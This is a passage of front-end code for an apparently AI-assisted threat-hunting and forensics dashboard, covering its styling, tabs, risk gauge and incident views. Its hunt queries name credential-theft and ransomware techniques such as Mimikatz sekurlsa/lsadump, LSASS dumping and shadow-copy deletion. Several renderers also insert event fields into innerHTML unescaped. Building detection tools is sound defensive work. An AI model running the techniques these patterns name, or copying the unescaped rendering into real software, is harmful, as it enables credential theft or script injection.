  /* ── ANIMATED SCANNING BORDER on focus ── */
  @keyframes rk-scan-border {
    0%   { clip-path: inset(0 100% 0 0); }
    50%  { clip-path: inset(0 0 0 0); }
    100% { clip-path: inset(0 0 0 100%); }
  }

  /* ── HEXAGONAL NODE (for chain nodes) ── */
  .rk-chain-node { cursor:pointer; transition:filter 0.2s; }
  .rk-chain-node:hover { filter:brightness(1.3) drop-shadow(0 0 8px rgba(0,212,255,0.4)); }

  /* ── NEON GLOW UTILITIES ── */
  .rk-glow-red    { filter:drop-shadow(0 0 8px rgba(239,68,68,0.6)); }
  .rk-glow-cyan   { filter:drop-shadow(0 0 8px rgba(0,212,255,0.5)); }
  .rk-glow-purple { filter:drop-shadow(0 0 8px rgba(167,139,250,0.5)); }
  .rk-glow-green  { filter:drop-shadow(0 0 8px rgba(52,211,153,0.5)); }

  /* ── RESPONSIVE ── */
  @media (max-width:900px) {
    .rk-stats-row { grid-template-columns:repeat(3,1fr); }
    .rk-grid-2 { grid-template-columns:1fr; }
    .rk-grid-3 { grid-template-columns:1fr 1fr; }
  }
  @media (max-width:600px) {
    .rk-stats-row { grid-template-columns:repeat(2,1fr); }
    .rk-grid-3 { grid-template-columns:1fr; }
  }

  /* ── Dual-ring spinner keyframes (used by _spinner helper) ── */
  @keyframes rk3-spin         { to   { transform:rotate(360deg); } }
  @keyframes rk3-spin-reverse { from { transform:rotate(0deg); } to { transform:rotate(-360deg); } }
  @keyframes rk3-glow-pulse   { 0%,100%{opacity:0.5;transform:scale(0.8)} 50%{opacity:1;transform:scale(1.2)} }
  @keyframes rk3-blink        { 0%,100%{opacity:1} 50%{opacity:0} }

  /* ── Hero scanning line that sweeps top-to-bottom on root ── */
  @keyframes rk-sweep {
    0%   { top:-2px; opacity:0.7; }
    95%  { top:100%; opacity:0.3; }
    100% { top:100%; opacity:0; }
  }
  .rk-sweep-line {
    position:absolute; left:0; right:0; height:2px; pointer-events:none; z-index:2;
    background:linear-gradient(90deg,transparent,rgba(0,212,255,0.6),transparent);
    box-shadow:0 0 12px rgba(0,212,255,0.4);
    animation:rk-sweep 6s linear infinite;
  }

  /* ── Stat card flash on update ── */
  @keyframes rk-stat-flash {
    0%   { background:rgba(0,212,255,0.08); }
    50%  { background:rgba(0,212,255,0.16); }
    100% { background:rgba(0,212,255,0.04); }
  }
  .rk-stat.flashed { animation:rk-stat-flash 0.6s ease-out; }

  /* ── Chain node hover tooltip ── */
  .rk-chain-svg-wrap {
    border-radius:10px;
    background:rgba(2,8,16,0.7);
    padding:8px;
    border:1px solid rgba(0,212,255,0.07);
    overflow:hidden;
  }
  .rk-chain-svg-wrap:hover {
    border-color:rgba(0,212,255,0.15);
    box-shadow:0 0 30px rgba(0,212,255,0.06);
  }

  /* ── Risk evolution bar enhancement ── */
  .rk-risk-evo-bar-wrap {
    display:flex; align-items:flex-end; gap:3px; height:56px;
    padding:4px 0;
  }
  .rk-risk-evo-seg {
    flex:1; border-radius:3px 3px 0 0; transition:all 0.4s ease;
    position:relative; cursor:pointer;
  }
  .rk-risk-evo-seg:hover { filter:brightness(1.4); transform:scaleY(1.08); transform-origin:bottom; }

  /* ── Incident card header cyber-border ── */
  .rk-inc-card-hdr {
    position:relative; overflow:hidden;
  }
  .rk-inc-card-hdr::after {
    content:''; position:absolute; bottom:0; left:0; right:0; height:1px;
    background:linear-gradient(90deg,transparent 0%,rgba(0,212,255,0.3) 30%,rgba(0,212,255,0.6) 50%,rgba(0,212,255,0.3) 70%,transparent 100%);
    background-size:200% 100%;
    animation:rk-border-flow 3s linear infinite;
  }

  /* ── Animated count-up number indicator ── */
  @keyframes rk-number-pop {
    0%   { transform:scale(1.3) translateY(-4px); opacity:0.6; }
    60%  { transform:scale(1.05) translateY(1px); }
    100% { transform:scale(1) translateY(0); opacity:1; }
  }
  .rk-stat-val.updated { animation:rk-number-pop 0.45s cubic-bezier(0.34,1.56,0.64,1); }

  /* ── Engine card active status dot ── */
  .rk-engine-status-dot {
    width:6px; height:6px; border-radius:50%; display:inline-block;
    margin-right:4px; vertical-align:middle;
  }
  .rk-engine-status-dot.online  { background:#34d399; box-shadow:0 0 6px rgba(52,211,153,0.8); animation:rk-pulse 2s infinite; }
  .rk-engine-status-dot.offline { background:#4b5563; }

  /* ── Hunt result row hover highlight ── */
  .rk-hunt-row:hover { background:rgba(0,212,255,0.04) !important; }

  /* ── Stage detail panel slide-in ── */
  @keyframes rk-detail-in {
    from { opacity:0; transform:translateY(-6px) scaleY(0.95); }
    to   { opacity:1; transform:translateY(0) scaleY(1); }
  }
  .rk-stage-detail-open { animation:rk-detail-in 0.2s ease-out; transform-origin:top; }

  /* ── Causal violation glow border ── */
  .rk-violation-glow {
    box-shadow:0 0 0 1px rgba(239,68,68,0.4), 0 0 16px rgba(239,68,68,0.15);
    border-color:rgba(239,68,68,0.5) !important;
  }

  /* ── Inferred stage opacity + italic styling ── */
  .rk-stage-inferred {
    opacity:0.72;
    border-style:dashed !important;
  }
</style>

<div class="rk-root" id="rk-root">

  <!-- Scanning sweep line overlay -->
  <div class="rk-sweep-line" aria-hidden="true"></div>

  <!-- ═══ HEADER ═══ -->
  <div class="rk-hdr">
    <!-- Logo -->
    <div style="display:flex;align-items:center;gap:12px;flex-shrink:0;">
      <div class="rk-logo-icon">⚔</div>
      <div>
        <div class="rk-logo-title">RAYKAN</div>
        <div class="rk-logo-sub">AI Threat Hunting &amp; DFIR Engine v${RAYKAN_VERSION} · OFFLINE-CAPABLE</div>
      </div>
    </div>

    <!-- WS connection badge -->
    <div id="rk-ws-badge" class="rk-ws-badge" style="margin-left:10px;">
      <span id="rk-ws-dot" style="width:7px;height:7px;border-radius:50%;background:#1a3040;transition:all 0.3s;flex-shrink:0;"></span>
      <span id="rk-ws-lbl" style="font-size:10px;">Offline</span>
    </div>

    <div style="margin-left:auto;display:flex;align-items:center;gap:8px;flex-wrap:wrap;">
      <!-- Risk badge -->
      <div id="rk-risk-badge" style="padding:5px 14px;border-radius:20px;font-size:11px;font-weight:700;
        font-family:'JetBrains Mono',monospace;background:rgba(107,114,128,0.1);
        color:#3d5a6b;border:1px solid rgba(107,114,128,0.15);">
        RISK: <span id="rk-risk-badge-val">—</span>
      </div>
      <!-- Session -->
      <div style="font-size:10px;color:#1a3040;font-family:'JetBrains Mono',monospace;">
        SID:<span id="rk-session-id" style="color:#2d4a5a;margin-left:3px;">—</span>
      </div>
      <!-- Actions -->
      <button class="rk-hdr-btn rk-hdr-btn-ghost" onclick="RAYKAN_UI.exportResults()" title="Export JSON results">
        ⬇ Export
      </button>
      <button class="rk-hdr-btn rk-hdr-btn-demo" onclick="RAYKAN_UI.runSample('ransomware')">
        ▶ Run Demo
      </button>
    </div>
  </div>

  <!-- ═══ STATS ROW ═══ -->
  <div class="rk-stats-row">
    ${_statCard('Events',      '0',  '#00d4ff', 'rk-s-events',  '—')}
    ${_statCard('Detections',  '0',  '#ef4444', 'rk-s-dets',    '—')}
    ${_statCard('Incidents',   '0',  '#f97316', 'rk-s-incidents','—')}
    ${_statCard('Anomalies',   '0',  '#f59e0b', 'rk-s-anom',    '—')}
    ${_statCard('Chains',      '0',  '#a78bfa', 'rk-s-chains',  '—')}
    ${_statCard('Risk Score',  '—',  '#ef4444', 'rk-s-risk',    '—')}
  </div>

  <!-- ═══ TABS ═══ -->
  <div class="rk-tabs" id="rk-tab-bar">
    ${_tabBtn('overview',    '◈',  'Overview')}
    ${_tabBtn('hunt',        '◎',  'Threat Hunt')}
    ${_tabBtn('ingest',      '⬆',  'Log Ingest')}
    ${_tabBtn('timeline',    '◷',  'Timeline')}
    ${_tabBtn('detections',  '⚡',  'Detections')}
    ${_tabBtn('incidents',   '⚔',  'Incidents')}
    ${_tabBtn('chains',      '⛓',  'Attack Chains')}
    ${_tabBtn('investigate', '◉',  'Investigate')}
    ${_tabBtn('ioc',         '⬡',  'IOC Lookup')}
    ${_tabBtn('anomalies',   '◬',  'UEBA / Anomalies')}
    ${_tabBtn('rules',       '≡',  'Rules')}
    ${_tabBtn('mitre',       '⊞',  'MITRE')}
    ${_tabBtn('rulegen',     '✦',  'AI Rule Gen')}
  </div>

  <!-- ═══ BODY ═══ -->
  <div class="rk-body" id="rk-body"></div>

  <!-- Toast container -->
  <div id="rk-toast-root" style="position:fixed;bottom:24px;right:24px;z-index:9999;display:flex;flex-direction:column;gap:8px;pointer-events:none;"></div>

</div>`;
  }

  // ── Helpers ────────────────────────────────────────────────────
  function _statCard(label, val, color, id, _trend) {
    return `<div class="rk-stat" style="--rk-stat-color:${color};">
  <div class="rk-stat-val" id="${id}" style="color:${color};">${val}</div>
  <div class="rk-stat-lbl">${label}</div>
  <!-- Ambient inner glow -->
  <div style="position:absolute;inset:0;pointer-events:none;
    background:radial-gradient(ellipse at 50% 120%,${color}09,transparent 70%);"></div>
</div>`;
  }

  function _tabBtn(id, icon, label) {
    return `<button class="rk-tab" data-tab="${id}" onclick="RAYKAN_UI._setTab('${id}')">${icon} ${label}</button>`;
  }

  function _sev(s) { return SEV[s] || SEV.informational; }

  function _sevBadge(s) {
    const c = _sev(s);
    const sevClass = { critical:'rk-sev-critical', high:'rk-sev-high', medium:'rk-sev-medium', low:'rk-sev-low', informational:'rk-sev-info' }[s] || 'rk-sev-info';
    return `<span class="rk-badge ${sevClass}">${c.icon} ${c.label}</span>`;
  }

  function _fmt(ts) {
    if (!ts) return '—';
    const d = ts instanceof Date ? ts : new Date(ts);
    return d.toLocaleString();
  }

  function _fmtTime(ts) {
    if (!ts) return '—';
    const d = ts instanceof Date ? ts : new Date(ts);
    return d.toLocaleTimeString();
  }

  function _truncate(s, n=80) {
    if (!s) return '—';
    return s.length > n ? s.slice(0, n) + '…' : s;
  }

  // ════════════════════════════════════════════════════════════════
  //  TAB ROUTING
  // ════════════════════════════════════════════════════════════════
  function _setTab(id) {
    S.activeTab = id;
    document.querySelectorAll('.rk-tab').forEach(b => b.classList.toggle('active', b.dataset.tab === id));
    const body = document.getElementById('rk-body');
    if (!body) return;
    body.innerHTML = '<div class="rk-panel">' + _renderTab(id) + '</div>';
    _afterTabRender(id);
  }

  function _renderTab(id) {
    switch (id) {
      case 'overview':    return _tplOverview();
      case 'hunt':        return _tplHunt();
      case 'ingest':      return _tplIngest();
      case 'timeline':    return _tplTimeline();
      case 'detections':  return _tplDetections();
      case 'incidents':   return _tplIncidents();
      case 'chains':      return _tplChains();
      case 'investigate': return _tplInvestigate();
      case 'ioc':         return _tplIOC();
      case 'anomalies':   return _tplAnomalies();
      case 'rules':       return _tplRules();
      case 'mitre':       return _tplMITRE();
      case 'rulegen':     return _tplRuleGen();
      default:            return '<div style="color:#6b7280;padding:60px;text-align:center;">Unknown tab</div>';
    }
  }

  function _afterTabRender(id) {
    if (id === 'overview')    { _renderOverviewContent(); }
    if (id === 'detections')  { _renderDetectionsList(S.detections); }
    if (id === 'incidents')   { _renderIncidentsList(S.incidents); }
    if (id === 'chains')      { _renderChainsList(S.chains); }
    if (id === 'timeline')    { _renderTimelineList(S.timeline); }
    if (id === 'anomalies')   { _renderAnomaliesList(S.anomalies); }
    if (id === 'rules')       { _loadRules(); }
    if (id === 'mitre')       { _loadMITRE(); }
    if (id === 'investigate' && S.investigateEntity) { _runInvestigation(S.investigateEntity); }
    if (id === 'ingest')      { _initUploadZone(); }
    if (id === 'hunt')        { _setHuntMode(S.huntMode); }
  }

  // ════════════════════════════════════════════════════════════════
  //  OVERVIEW TAB
  // ════════════════════════════════════════════════════════════════
  function _tplOverview() {
    return `
<div>
  <!-- Engine status bar -->
  <div style="display:flex;align-items:center;gap:12px;margin-bottom:20px;flex-wrap:wrap;">
    <div style="font-size:13px;color:#8b949e;">
      Engine ready · Last updated: <span id="rk-last-upd" style="color:#60a5fa;">—</span>
    </div>
    <div id="rk-engine-health" style="display:flex;gap:8px;flex-wrap:wrap;"></div>
    <div style="margin-left:auto;display:flex;gap:8px;flex-wrap:wrap;">
      <button class="rk-btn rk-btn-red"    onclick="RAYKAN_UI.runSample('ransomware')">🎯 Ransomware Demo</button>
      <button class="rk-btn rk-btn-purple" onclick="RAYKAN_UI.runSample('lateral_movement')">↔️ Lateral Movement</button>
      <button class="rk-btn rk-btn-ghost"  onclick="RAYKAN_UI.runSample('credential_dump')">🔑 Credential Dump</button>
    </div>
  </div>

  <!-- Risk ring + recent detections -->
  <div class="rk-grid-2" style="margin-bottom:16px;">
    <!-- Risk gauge -->
    <div class="rk-card" style="padding:20px;">
      <div style="font-size:12px;font-weight:700;color:#8b949e;margin-bottom:16px;text-transform:uppercase;letter-spacing:.5px;">
        🛡 Session Risk Score
      </div>
      <div id="rk-risk-gauge" style="display:flex;align-items:center;gap:20px;">
        <div style="position:relative;width:100px;height:100px;flex-shrink:0;">
          <svg width="100" height="100" viewBox="0 0 100 100" style="transform:rotate(-90deg)">
            <circle cx="50" cy="50" r="42" fill="none" stroke="#21262d" stroke-width="10"/>
            <circle id="rk-risk-arc" cx="50" cy="50" r="42" fill="none" stroke="#ef4444"
              stroke-width="10" stroke-dasharray="264" stroke-dashoffset="264"
              stroke-linecap="round" style="transition:stroke-dashoffset 1s ease;"/>
          </svg>
          <div id="rk-risk-num" style="position:absolute;inset:0;display:flex;align-items:center;justify-content:center;
            font-size:22px;font-weight:800;color:#e6edf3;">0</div>
        </div>
        <div>
          <div id="rk-risk-label" style="font-size:18px;font-weight:700;color:#22c55e;">Clean</div>
          <div style="font-size:12px;color:#6b7280;margin-top:4px;">Based on ${S.detections.length} detections</div>
          <div style="font-size:11px;color:#4b5563;margin-top:8px;">
            Session: <span id="rk-ov-session" style="color:#6b7280;">—</span>
          </div>
        </div>
      </div>
      <!-- Progress bars by severity -->
      <div id="rk-sev-bars" style="margin-top:16px;display:flex;flex-direction:column;gap:6px;"></div>
    </div>

    <!-- Recent detections -->
    <div class="rk-card">
      <div class="rk-card-hdr">
        <span style="font-size:13px;font-weight:600;">🚨 Recent Detections</span>
        <span id="rk-ov-det-count" style="font-size:11px;color:#6b7280;">0 total</span>
      </div>
      <div id="rk-ov-dets" style="max-height:260px;overflow-y:auto;">
        <div style="padding:40px;text-align:center;color:#4b5563;font-size:13px;">
          No detections yet — run a demo or ingest logs.
        </div>
      </div>
    </div>
  </div>

  <!-- Sub-engine status grid -->
  <div class="rk-grid-3" style="margin-bottom:16px;" id="rk-engine-cards">
    ${_engineCard('⚙️ Sigma Engine',   'rk-sigma-rules',  '#34d399', 'Rules loaded')}
    ${_engineCard('🤖 AI Detector',    'rk-ai-prov',      '#60a5fa', 'Provider')}
    ${_engineCard('👥 UEBA Engine',    'rk-ueba-prof',    '#f59e0b', 'Profiles')}
    ${_engineCard('🔗 Attack Chains',  'rk-chains-cnt',   '#a78bfa', 'Reconstructed')}
    ${_engineCard('⏱ Uptime',         'rk-uptime-val',   '#e2e8f0', 'Seconds')}
    ${_engineCard('📥 Buffer',         'rk-buffer-val',   '#6b7280', 'Events in memory')}
  </div>

  <!-- Attack chain preview -->
  <div class="rk-card">
    <div class="rk-card-hdr">
      <span style="font-size:13px;font-weight:600;">🔗 Attack Chain Preview</span>
      <button class="rk-btn rk-btn-ghost" onclick="RAYKAN_UI._setTab('chains')" style="font-size:11px;">View All →</button>
    </div>
    <div id="rk-ov-chains" style="padding:16px;min-height:60px;">
      <div style="color:#4b5563;font-size:13px;text-align:center;padding:20px;">
        No attack chains detected.
      </div>
    </div>
  </div>
</div>`;
  }

  function _engineCard(label, id, color, sub) {
    return `<div class="rk-card" style="padding:16px;position:relative;overflow:hidden;">
  <!-- Side accent bar -->
  <div style="position:absolute;top:0;left:0;width:3px;height:100%;
    background:linear-gradient(180deg,${color},${color}44);opacity:0.7;"></div>
  <div style="font-size:10px;font-weight:700;color:${color};margin-bottom:10px;
    text-transform:uppercase;letter-spacing:1px;
    font-family:'JetBrains Mono',monospace;
    text-shadow:0 0 8px ${color}66;">${label}</div>
  <div class="rk-stat-val" id="${id}" style="font-size:24px;color:#e2e8f0;
    font-family:'JetBrains Mono',monospace;line-height:1;
    filter:drop-shadow(0 0 6px ${color}44);">—</div>
  <div class="rk-stat-lbl" style="margin-top:5px;">${sub}</div>
  <!-- Bottom glow line -->
  <div style="position:absolute;bottom:0;left:0;right:0;height:1px;
    background:linear-gradient(90deg,transparent,${color}44,transparent);"></div>
</div>`;
  }

  function _renderOverviewContent() {
    // Detections list
    const ovDets = document.getElementById('rk-ov-dets');
    if (ovDets && S.detections.length) {
      ovDets.innerHTML = S.detections.slice(0, 8).map(d => `
<div class="rk-det-row" onclick="RAYKAN_UI._showDetDetail('${d.id || ''}')">
  <div style="flex-shrink:0;margin-top:2px;">${_sev(d.severity).icon}</div>
  <div style="flex:1;min-width:0;">
    <div style="font-size:12px;font-weight:600;color:#e6edf3;">${d.ruleName || d.title || 'Detection'}</div>
    <div style="font-size:11px;color:#6b7280;margin-top:2px;">${d.computer||d.host||''} · ${_fmtTime(d.timestamp)}</div>
    <div style="font-size:10px;color:#4b5563;margin-top:2px;">${d.mitre?.technique || ''}</div>
  </div>
  ${_sevBadge(d.severity)}
</div>`).join('');
      document.getElementById('rk-ov-det-count').textContent = S.detections.length + ' total';
    }

    // Risk gauge
    const risk = S.riskScore || 0;
    const arc  = document.getElementById('rk-risk-arc');
    if (arc) {
      const offset = 264 - (264 * risk / 100);
      arc.style.strokeDashoffset = offset;
      arc.style.stroke = risk >= 80 ? '#ef4444' : risk >= 60 ? '#f97316' : risk >= 40 ? '#eab308' : '#22c55e';
    }
    const num = document.getElementById('rk-risk-num');
    if (num) num.textContent = risk;
    const lbl = document.getElementById('rk-risk-label');
    if (lbl) {
      lbl.textContent = risk >= 80 ? 'Critical' : risk >= 60 ? 'High' : risk >= 40 ? 'Medium' : risk > 0 ? 'Low' : 'Clean';
      lbl.style.color = risk >= 80 ? '#ef4444' : risk >= 60 ? '#f97316' : risk >= 40 ? '#eab308' : '#22c55e';
    }

    // Severity bars
    const bars = document.getElementById('rk-sev-bars');
    if (bars) {
      const counts = { critical:0, high:0, medium:0, low:0 };
      S.detections.forEach(d => { if (counts[d.severity] !== undefined) counts[d.severity]++; });
      const total = S.detections.length || 1;
      bars.innerHTML = Object.entries(counts).map(([sev, cnt]) => `
<div style="display:flex;align-items:center;gap:8px;">
  <div style="width:55px;font-size:10px;color:${SEV[sev].color};text-transform:uppercase;font-weight:700;">${sev}</div>
  <div class="rk-progress" style="flex:1;height:6px;">
    <div class="rk-progress-bar" style="width:${(cnt/total*100).toFixed(0)}%;background:${SEV[sev].color};"></div>
  </div>
  <div style="width:24px;font-size:10px;color:#6b7280;text-align:right;">${cnt}</div>
</div>`).join('');
    }

    // Session
    const sess = document.getElementById('rk-ov-session');
    if (sess && S.sessionId) sess.textContent = S.sessionId.slice(0, 8) + '…';

    // Chains preview
    const chains = document.getElementById('rk-ov-chains');
    if (chains && S.chains.length) {
      chains.innerHTML = S.chains.slice(0, 2).map(c => _chainPreview(c)).join('');
    }
  }

  // ════════════════════════════════════════════════════════════════
  //  THREAT HUNT TAB
  // ════════════════════════════════════════════════════════════════
  function _tplHunt() {
    return `
<div>
  <div style="display:flex;gap:8px;margin-bottom:14px;">
    <button id="rk-h-rql" class="rk-btn rk-btn-ghost" onclick="RAYKAN_UI._setHuntMode('rql')"
      style="font-size:12px;">🔍 RQL Query</button>
    <button id="rk-h-nl"  class="rk-btn rk-btn-ghost" onclick="RAYKAN_UI._setHuntMode('nl')"
      style="font-size:12px;">💬 Natural Language</button>
    <div style="margin-left:auto;font-size:11px;color:#4b5563;align-self:center;">
      RQL: Sigma-like field:value syntax | NL: plain-English query
    </div>
  </div>

  <div class="rk-card" style="padding:16px;margin-bottom:16px;">
    <textarea id="rk-h-input" rows="4"
      placeholder='process.name:"powershell.exe" AND commandLine:*EncodedCommand*'
      class="rk-input rk-code" style="resize:vertical;min-height:80px;border-radius:6px;"></textarea>
    <div style="display:flex;justify-content:space-between;align-items:center;margin-top:10px;flex-wrap:wrap;gap:8px;">
      <div style="display:flex;gap:6px;flex-wrap:wrap;" id="rk-hunt-chips">
        ${_huntChips()}
      </div>
      <div style="display:flex;gap:8px;">
        <select class="rk-select" id="rk-h-time">
          <option value="1h">Last 1h</option>
          <option value="6h">Last 6h</option>
          <option value="24h" selected>Last 24h</option>
          <option value="7d">Last 7d</option>
          <option value="all">All Time</option>
        </select>
        <button id="rk-h-btn" class="rk-btn rk-btn-primary" onclick="RAYKAN_UI.executeHunt()" style="min-width:90px;">
          Hunt ▶
        </button>
      </div>
    </div>
  </div>

  <!-- Saved hunts -->
  <div style="margin-bottom:16px;">
    <div style="font-size:11px;color:#6b7280;font-weight:600;text-transform:uppercase;letter-spacing:.4px;margin-bottom:8px;">
      Saved Hunt Queries
    </div>
    <div style="display:flex;gap:8px;flex-wrap:wrap;" id="rk-saved-hunts">
      ${_savedHunts()}
    </div>
  </div>

  <!-- Results -->
  <div id="rk-h-results">
    <div style="padding:50px;text-align:center;color:#4b5563;font-size:13px;">
      Enter a query and click Hunt ▶ to search event history.
    </div>
  </div>
</div>`;
  }

  function _huntChips() {
    const chips = [
      ['PS Encoded',    'process.name:"powershell.exe" AND commandLine:*EncodedCommand*'],
      ['Mimikatz',      'commandLine:*sekurlsa* OR commandLine:*lsadump*'],
      ['VSS Delete',    'commandLine:*vssadmin*delete*'],
      ['PsExec',        'process.name:"psexec.exe"'],
      ['LSASS Dump',    'commandLine:*lsass*'],
      ['RDP Brute',     'event.id:4625 AND dstPort:3389'],
      ['Scheduled Task','commandLine:*schtasks* AND commandLine:*/create*'],
      ['WMI Exec',      'process.name:"wmiprvse.exe"'],
    ];
    return chips.map(([l,q]) =>
      `<button class="rk-chip" onclick="document.getElementById('rk-h-input').value=decodeURIComponent('${encodeURIComponent(q)}')">${l}</button>`
    ).join('');
  }

  function _savedHunts() {
    const saved = [
      ['🕸 Cobalt Strike Beacons', 'dstPort:443 AND process.name:*round* OR commandLine:*beacon*'],
      ['📡 DNS Tunneling',         'domain:*.*.*.* AND queryType:TXT'],
      ['🔑 Pass-the-Hash',         'event.id:4624 AND logonType:3 AND user:*$*'],
      ['🧬 BITS Job Abuse',        'commandLine:*bitsadmin*transfer*'],
    ];
    return saved.map(([l,q]) =>
      `<button class="rk-chip" style="padding:4px 12px;font-size:11px;" onclick="document.getElementById('rk-h-input').value=decodeURIComponent('${encodeURIComponent(q)}');RAYKAN_UI._setHuntMode('rql')">${l}</button>`
    ).join('');
  }

  // ════════════════════════════════════════════════════════════════
  //  LOG INGEST TAB
  // ════════════════════════════════════════════════════════════════
  function _tplIngest() {
    return `
<div>
  <div class="rk-grid-2" style="margin-bottom:16px;">
    <!-- Upload -->
    <div class="rk-card" style="padding:20px;">
      <div style="font-size:13px;font-weight:600;margin-bottom:14px;">📁 Upload Log File</div>
      <div class="rk-upload-zone" id="rk-drop-zone" onclick="document.getElementById('rk-file-in').click()">
        <div style="font-size:32px;margin-bottom:8px;">📂</div>
        <div style="font-size:14px;font-weight:600;color:#e6edf3;">Drop logs here or click to browse</div>
        <div style="font-size:12px;color:#6b7280;margin-top:6px;">Supports: JSON, EVTX, Syslog, CEF, LEEF, CSV</div>
        <input type="file" id="rk-file-in" style="display:none" accept=".json,.log,.txt,.csv,.evtx"
          onchange="RAYKAN_UI._handleFileUpload(this.files[0])"/>
      </div>
      <div id="rk-upload-progress" style="display:none;margin-top:12px;">
        <div style="font-size:12px;color:#8b949e;margin-bottom:6px;" id="rk-upload-msg">Processing…</div>
        <div class="rk-progress">
          <div class="rk-progress-bar" id="rk-upload-bar" style="width:0%;"></div>
        </div>
      </div>
    </div>

    <!-- Paste JSON -->
    <div class="rk-card" style="padding:20px;">
      <div style="font-size:13px;font-weight:600;margin-bottom:14px;">📋 Paste JSON Events</div>
      <textarea id="rk-paste-events" rows="6"
        class="rk-input rk-code" style="resize:vertical;border-radius:6px;font-size:11px;"
        placeholder='[{"EventID":4688,"Computer":"ws01","User":"CORP\\\\jdoe","CommandLine":"cmd.exe /c whoami"}]'></textarea>
      <div style="display:flex;gap:8px;margin-top:10px;">
        <select class="rk-select" id="rk-paste-fmt">
          <option value="json">JSON</option>
          <option value="syslog">Syslog</option>
          <option value="cef">CEF</option>
        </select>
        <button class="rk-btn rk-btn-primary" onclick="RAYKAN_UI.ingestPasted()" style="flex:1;">
          📤 Analyze
        </button>
      </div>
    </div>
  </div>

  <!-- Quick sample scenarios -->
  <div class="rk-card" style="padding:16px;margin-bottom:16px;">
    <div style="font-size:12px;font-weight:700;color:#8b949e;text-transform:uppercase;letter-spacing:.4px;margin-bottom:12px;">
      Demo Attack Scenarios
    </div>
    <div style="display:flex;gap:10px;flex-wrap:wrap;">
      ${_scenarioBtn('ransomware',        '🔴', 'Ransomware',        'LockerGoga / RansomHub simulation')}
      ${_scenarioBtn('lateral_movement',  '🟠', 'Lateral Movement',  'PsExec + WMI + SMB spread')}
      ${_scenarioBtn('credential_dump',   '🟡', 'Credential Dump',   'Mimikatz / LSASS dump')}
      ${_scenarioBtn('apt',               '🟣', 'APT Campaign',      'Multi-stage nation-state attack')}
      ${_scenarioBtn('insider',           '🔵', 'Insider Threat',    'Exfil via cloud storage')}
      ${_scenarioBtn('supply_chain',      '⚫', 'Supply Chain',      'Dependency hijack + backdoor')}
    </div>
  </div>

  <!-- Ingest results summary -->
  <div id="rk-ingest-result" style="min-height:60px;"></div>
</div>`;
  }

  function _scenarioBtn(id, icon, name, desc) {
    return `<button onclick="RAYKAN_UI.runSample('${id}')" style="
      padding:12px 16px;border-radius:8px;font-size:12px;font-weight:600;cursor:pointer;
      background:#161b22;border:1px solid #30363d;color:#e6edf3;text-align:left;
      transition:.15s;min-width:180px;">
      <div style="font-size:16px;margin-bottom:4px;">${icon} ${name}</div>
      <div style="font-size:10px;color:#6b7280;">${desc}</div>
    </button>`;
  }

  // ════════════════════════════════════════════════════════════════
  //  TIMELINE TAB
  // ════════════════════════════════════════════════════════════════
  function _tplTimeline() {
    return `
<div>
  <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:14px;flex-wrap:wrap;gap:8px;">
    <div style="font-size:13px;color:#8b949e;">Chronological forensic timeline of events and detections.</div>
    <div style="display:flex;gap:8px;">
      <select class="rk-select" id="rk-tl-filter" onchange="RAYKAN_UI._filterTimeline()">
        <option value="">All Types</option>
        <option value="detection">Detections</option>
        <option value="process">Process Events</option>
        <option value="network">Network Events</option>
        <option value="file">File Events</option>
        <option value="registry">Registry Events</option>
      </select>
      <button class="rk-btn rk-btn-ghost" onclick="RAYKAN_UI._exportTimeline()">↓ Export CSV</button>
    </div>
  </div>
  <div id="rk-tl-container" class="rk-card" style="padding:16px;min-height:200px;">
    <div style="color:#4b5563;font-size:13px;text-align:center;padding:60px;">
      Run an analysis to populate the timeline.
    </div>
  </div>
</div>`;
  }

  // ════════════════════════════════════════════════════════════════
  //  DETECTIONS TAB
  // ════════════════════════════════════════════════════════════════
  // ════════════════════════════════════════════════════════════════
  //  INCIDENTS TAB  (Temporal-Identity Correlation view)
  //  Shows ONE consolidated incident per correlated alert cluster,
  //  with expandable child alerts and cross-log link information.
  // ════════════════════════════════════════════════════════════════
  // ════════════════════════════════════════════════════════════════
  //  SOC v5 — INCIDENTS TAB TEMPLATE & RENDERER
  //  Forensically accurate, analyst-trustworthy, production-ready.
  // ════════════════════════════════════════════════════════════════
  // ════════════════════════════════════════════════════════════════
  //  ACE v6 — ADVERSARY-CENTRIC INCIDENTS DASHBOARD
  //  SOC-grade, forensically trustworthy incident view showing:
  //    • Unified cross-host attack chain per adversary
  //    • DAG phase sequence with causal ordering
  //    • Multi-factor ACE score (0-100) with severity band
  //    • Cross-host pivot metadata (all hosts, users, IPs)
  //    • Full MITRE mapping per child node
  //    • Intent classification (admin vs attacker)
  //    • Forensic timeline with real timestamps, duration
  //    • Confidence-based narratives
  // ════════════════════════════════════════════════════════════════
  function _tplIncidents() {
    return `
<div>
  <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:14px;flex-wrap:wrap;gap:8px;">
    <div>
      <div style="font-size:14px;color:#e6edf3;font-weight:700;">⚔️ BCE v10 — Behavior-Driven Attack Chain Reconstruction Engine</div>
      <div style="font-size:12px;color:#8b949e;margin-top:2px;">
        Multi-stage attack chains · Inferred stage filling · Visual chain flow · Chain-aware progressive risk · One-click SOC actions
      </div>
    </div>
    <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap;">
      <span id="rk-inc-badge" style="font-size:11px;padding:4px 10px;background:rgba(239,68,68,0.1);color:#ef4444;border-radius:10px;font-weight:700;">0 Incidents</span>
      <span id="rk-inc-confidence-badge" style="font-size:11px;padding:4px 10px;background:rgba(52,211,153,0.1);color:#34d399;border-radius:10px;display:none;"></span>
      <button class="rk-btn rk-btn-ghost" style="font-size:11px;" onclick="RAYKAN_UI._setTab('detections')">All Detections →</button>
      <button class="rk-btn rk-btn-ghost" style="font-size:11px;" onclick="RAYKAN_UI._setTab('timeline')">Timeline →</button>
    </div>
  </div>
  <div id="rk-inc-statsbar" style="display:flex;gap:12px;flex-wrap:wrap;margin-bottom:14px;"></div>
  <div id="rk-inc-list" style="display:flex;flex-direction:column;gap:16px;"></div>
</div>`;
  }

  function _renderIncidentsList(incidents) {
    const el = document.getElementById('rk-inc-list');
    if (!el) return;

    const badge = document.getElementById('rk-inc-badge');
    if (badge) badge.textContent = `${incidents.length} Incident${incidents.length !== 1 ? 's' : ''}`;

    const confBadge = document.getElementById('rk-inc-confidence-badge');
    if (confBadge && incidents.length) {
      const avgConf = Math.round(incidents.reduce((s, i) => s + (i.confidence?.score || 0), 0) / incidents.length);
      confBadge.style.display = '';
      confBadge.textContent = `Avg Confidence: ${avgConf}%`;
    }

